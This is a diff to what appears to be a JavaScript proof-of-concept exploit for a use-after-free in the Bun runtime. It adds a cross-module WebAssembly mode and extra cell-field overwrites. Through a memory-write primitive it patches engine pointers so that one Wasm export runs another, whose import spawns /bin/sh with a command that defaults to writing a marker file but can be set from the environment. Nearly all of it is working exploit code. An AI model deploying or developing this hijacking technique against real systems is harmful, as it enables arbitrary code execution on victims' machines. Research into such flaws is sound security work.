@@ -35,11 +35,15 @@ const markerPath = process.env.MARKER_PATH || "/tmp/bun_uaf_noffi_wasm_marker";
 const commandImport = process.env.COMMAND_IMPORT === "1";
 const commandMarkerPath = process.env.COMMAND_MARKER_PATH || "/tmp/bun_uaf_noffi_command_marker";
 const markerCommand = process.env.MARKER_COMMAND || `printf 'wasm-command:${process.pid}\\n' > ${commandMarkerPath}`;
+const crossModule = process.env.CROSS_MODULE === "1";
 const fakeDescriptor = process.env.FAKE_DESCRIPTOR === "1";
 const fakeDescriptorMode = process.env.FAKE_DESCRIPTOR_MODE || "replacement";
 const fakeDescriptorWordEnv = process.env.FAKE_DESCRIPTOR_WORD;
-const patchScope = process.env.PATCH_SCOPE || (markerImport ? "cell" : "exec");
+const patchScope = process.env.PATCH_SCOPE || ((markerImport || fakeDescriptor) ? "cell" : "exec");
 const patchField = Number(process.env.PATCH_FIELD || (patchScope === "cell" ? 48 : wasmCodeField));
+const extraCellFields = process.env.EXTRA_CELL_FIELDS
+  ? process.env.EXTRA_CELL_FIELDS.split(",").filter(Boolean).map(value => Number(value))
+  : [];
 const readBytes = Number(process.env.READ_BYTES || 64);
 const warmIterations = Number(process.env.WARM_ITERATIONS || 10000);
 const retainedBridgeCarriers = [];
@@ -335,6 +339,63 @@ function makeWasmExports() {
   let markerArmed = false;
   let commandStatus = null;
   let commandError = null;
+  const imports = markerImport ? {
+    env: {
+      mark() {
+        if (markerArmed) {
+          if (commandImport) {
+            const result = spawnSync("/bin/sh", ["-c", markerCommand], { stdio: "ignore" });
+            commandStatus = result.status;
+            commandError = result.error?.message || null;
+          }
+          fs.writeFileSync(markerPath, `wasm-marker:${process.pid}\n`);
+        }
+        return 7;
+      },
+    },
+  } : {};
+
+  if (crossModule) {
+    const targetWasm = new Uint8Array([
+      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+      0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
+      0x03, 0x02, 0x01, 0x00,
+      0x07, 0x05, 0x01, 0x01, 0x61, 0x00, 0x00,
+      0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
+    ]);
+    const replacementWasm = markerImport
+      ? new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
+        0x02, 0x0c, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x04, 0x6d, 0x61, 0x72, 0x6b, 0x00, 0x00,
+        0x03, 0x02, 0x01, 0x00,
+        0x07, 0x05, 0x01, 0x01, 0x62, 0x00, 0x01,
+        0x0a, 0x06, 0x01, 0x04, 0x00, 0x10, 0x00, 0x0b,
+      ])
+      : new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
+        0x03, 0x02, 0x01, 0x00,
+        0x07, 0x05, 0x01, 0x01, 0x62, 0x00, 0x00,
+        0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x07, 0x0b,
+      ]);
+    const targetInstance = new WebAssembly.Instance(new WebAssembly.Module(targetWasm));
+    const replacementInstance = new WebAssembly.Instance(new WebAssembly.Module(replacementWasm), imports);
+    const a = targetInstance.exports.a;
+    const b = replacementInstance.exports.b;
+    for (let i = 0; i < warmIterations; i++) {
+      a();
+      b();
+    }
+    return {
+      a,
+      b,
+      armMarker() { markerArmed = true; },
+      disarmMarker() { markerArmed = false; },
+      commandResult() { return { status: commandStatus, error: commandError }; },
+    };
+  }
+
   const wasm = markerImport
     ? new Uint8Array([
       0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
@@ -351,21 +412,6 @@ function makeWasmExports() {
       0x07, 0x09, 0x02, 0x01, 0x61, 0x00, 0x00, 0x01, 0x62, 0x00, 0x01,
       0x0a, 0x0b, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x04, 0x00, 0x41, 0x07, 0x0b,
     ]);
-  const imports = markerImport ? {
-    env: {
-      mark() {
-        if (markerArmed) {
-          if (commandImport) {
-            const result = spawnSync("/bin/sh", ["-c", markerCommand], { stdio: "ignore" });
-            commandStatus = result.status;
-            commandError = result.error?.message || null;
-          }
-          fs.writeFileSync(markerPath, `wasm-marker:${process.pid}\n`);
-        }
-        return 7;
-      },
-    },
-  } : {};
   const instance = new WebAssembly.Instance(new WebAssembly.Module(wasm), imports);
   const a = instance.exports.a;
   const b = instance.exports.b;
@@ -439,10 +485,28 @@ const patchB = patchBase(infoB);
 if (patchField < 0 || patchField + 8 > patchA.bytes.length || patchField + 8 > patchB.bytes.length) {
   throw new Error("PATCH_FIELD must leave room for one qword inside READ_BYTES");
 }
+if (extraCellFields.length > 0 && patchScope !== "cell") {
+  throw new Error("EXTRA_CELL_FIELDS requires PATCH_SCOPE=cell");
+}
+for (const offset of extraCellFields) {
+  if (!Number.isFinite(offset) || offset < 0 || offset + 8 > patchA.bytes.length || offset + 8 > patchB.bytes.length) {
+    throw new Error("each EXTRA_CELL_FIELDS entry must leave room for one qword inside READ_BYTES");
+  }
+}
 
 const patchAddress = patchA.address + BigInt(patchField);
 const originalPatchValue = readU64LEBytes(patchA.bytes, patchField);
 const replacementPatchValue = readU64LEBytes(patchB.bytes, patchField);
+const extraPatches = extraCellFields.map(offset => {
+  const originalValue = readU64LEBytes(patchA.bytes, offset);
+  const replacementValue = readU64LEBytes(patchB.bytes, offset);
+  return {
+    offset,
+    address: patchA.address + BigInt(offset),
+    originalValue,
+    replacementValue,
+  };
+});
 let effectiveReplacementPatchValue = replacementPatchValue;
 let fakeDescriptorSummary = null;
 
@@ -517,6 +581,9 @@ let restoreError;
 let patchError;
 
 try {
+  for (const patch of extraPatches) {
+    writeU64Address(patch.address, patch.replacementValue);
+  }
   writeU64Address(patchAddress, effectiveReplacementPatchValue);
   if (markerImport) armMarker();
   patchedA = a();
@@ -526,6 +593,10 @@ try {
   if (markerImport) disarmMarker();
   try {
     writeU64Address(patchAddress, originalPatchValue);
+    for (let i = extraPatches.length - 1; i >= 0; i--) {
+      const patch = extraPatches[i];
+      writeU64Address(patch.address, patch.originalValue);
+    }
     restoredA = a();
   } catch (error) {
     restoreError = error?.message || String(error);
@@ -565,6 +636,7 @@ const output = {
   commandMarkerBefore,
   commandMarkerAfter,
   commandResultAfter,
+  crossModule,
   fakeDescriptor,
   fakeDescriptorMode: fakeDescriptor ? fakeDescriptorMode : undefined,
   fakeDescriptorSummary,
@@ -572,6 +644,15 @@ const output = {
   wasmCodeField,
   patchScope,
   patchField,
+  extraCellFields,
+  extraPatches: extraPatches.map(patch => ({
+    offset: patch.offset,
+    address: hex(patch.address),
+    originalValue: hex(patch.originalValue),
+    originalClass: classifyPointer(patch.originalValue),
+    replacementValue: hex(patch.replacementValue),
+    replacementClass: classifyPointer(patch.replacementValue),
+  })),
   patchTarget: patchA.label,
   patchAddress: hex(patchAddress),
   originalPatchValue: hex(originalPatchValue),
